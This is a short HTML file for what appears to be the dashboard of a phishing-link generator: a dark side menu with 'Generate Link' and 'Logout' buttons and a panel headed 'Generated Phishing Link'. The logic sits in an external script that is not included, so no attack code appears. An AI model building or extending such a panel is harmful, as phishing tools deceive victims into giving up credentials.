<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        #menu {
            width: 200px;
            height: 100vh;
            background: #222;
            color: white;
            padding: 20px;
            position: fixed;
            left: 0;
            top: 0;
        }
        #menu button {
            display: block;
            width: 100%;
            margin: 10px 0;
            padding: 10px;
            border: none;
            background: #444;
            color: white;
            cursor: pointer;
            transition: 0.3s;
        }
        #menu button:hover {
            background: #666;
        }
        #content {
            margin-left: 220px;
            padding: 20px;
        }
    </style>
</head>
<body>

<div id="menu">
    <button onclick="generateLink()">Generate Link</button>
    <button onclick="logout()">Logout</button>
</div>

<div id="content">
    <h2>Dashboard</h2>
    <h3>Generated Phishing Link</h3>
    <p id="generatedLink">Click "Generate Link" to create one.</p>
</div>

<script src="script.js"></script>
</body>
</html>
